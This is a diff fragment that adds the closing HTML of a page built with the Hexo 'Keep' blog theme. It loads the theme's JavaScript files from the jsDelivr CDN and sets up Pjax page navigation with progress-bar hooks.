+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/js/dark-light-toggle.js"></script>
+
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/js/code-block-tools.js"></script>
+
+
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/js/toc.js"></script>
+    
+</div>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.9/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
